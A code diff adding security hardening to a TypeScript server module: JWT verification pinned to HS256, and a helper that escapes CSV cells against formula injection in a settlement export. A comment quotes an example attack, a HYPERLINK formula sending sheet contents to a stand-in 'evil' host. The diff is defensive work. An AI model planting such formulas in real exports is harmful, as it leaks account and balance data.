@@ -244,3 +244,64 @@ export function commissionPercentOf(
   const n = typeof value === "number" ? value : parseFloat(String(value ?? ""));
   return Number.isFinite(n) && n >= 0 && n <= 100 ? n : fallback;
 }
+
+// ── JWT verification hardening (H-09) ───────────────────────────────────────
+//
+// All four audiences — admin, customer, driver, vendor — are signed with the same
+// JWT_SECRET, carry no `aud`/`iss`, and were verified with the algorithm left open.
+// Role separation therefore rests entirely on each verifier remembering to check
+// its own discriminator (`type: "admin"` / `role: "customer" | "driver" | "vendor"`).
+// All 14 verify sites do check one today, and a guardrail test keeps it that way.
+//
+// Pinning the algorithm is the piece that does not depend on anyone remembering:
+// it forbids the verifier from being talked into a different algorithm by the
+// token's own header. jsonwebtoken 9 already rejects `alg: none`, so this is
+// defence in depth rather than a live hole — but it costs nothing and every token
+// the project issues is HS256 anyway, so no existing session is affected.
+//
+// NOT done here, deliberately: adding `aud` per audience, or a separate secret per
+// audience. Either one invalidates every token already in circulation (customers
+// and drivers hold 30-day tokens, vendors 7-day), i.e. it logs the whole user base
+// out at deploy time. That is a release decision, not a code cleanup.
+
+/** The only algorithm this project signs with. Never widen without a migration plan. */
+export const JWT_ALGORITHMS = ["HS256"] as const;
+
+/** Verify options shared by every jwt.verify() call in the server. */
+export const JWT_VERIFY_OPTS = { algorithms: JWT_ALGORITHMS as unknown as ["HS256"] };
+
+// ── CSV export safety (H-15) ────────────────────────────────────────────────
+//
+// The settlement export escaped double quotes in ONE cell (the name), which keeps
+// the file's structure valid but does nothing about formula injection. A cell
+// beginning with = + - @ (or a tab/CR that Excel trims down to one) is evaluated
+// when the file is opened, and `accountName` is the store's own display name —
+// attacker-controlled. A store called `=HYPERLINK("http://evil/"&A1&B1,"x")` runs
+// on the supervisor's machine and can exfiltrate the whole sheet: every account,
+// every outstanding balance.
+//
+// Two separate problems, so two separate fixes in one helper:
+//   • prefix a single quote when the value opens with a formula trigger, which
+//     Excel and LibreOffice both treat as "this cell is text";
+//   • double every embedded quote and wrap the cell, so the structure holds.
+
+/** Characters that make a spreadsheet treat the rest of the cell as a formula. */
+const CSV_FORMULA_TRIGGERS = ["=", "+", "-", "@", "\t", "\r"];
+
+/**
+ * One CSV cell: neutralised against formula injection and safely quoted.
+ * Apply to EVERY text cell — a single unescaped column is enough.
+ */
+export function csvCell(value: unknown): string {
+  let s = value === null || value === undefined ? "" : String(value);
+  // Leading whitespace is trimmed by spreadsheets before the trigger is read,
+  // so " =cmd" is just as dangerous as "=cmd".
+  if (CSV_FORMULA_TRIGGERS.some((c) => s.trimStart().startsWith(c))) s = `'${s}`;
+  return `"${s.replace(/"/g, '""')}"`;
+}
+
+/** A numeric CSV cell — never quoted, never able to carry text. */
+export function csvNumber(value: unknown): string {
+  const n = Number(value);
+  return String(Number.isFinite(n) ? n : 0);
+}
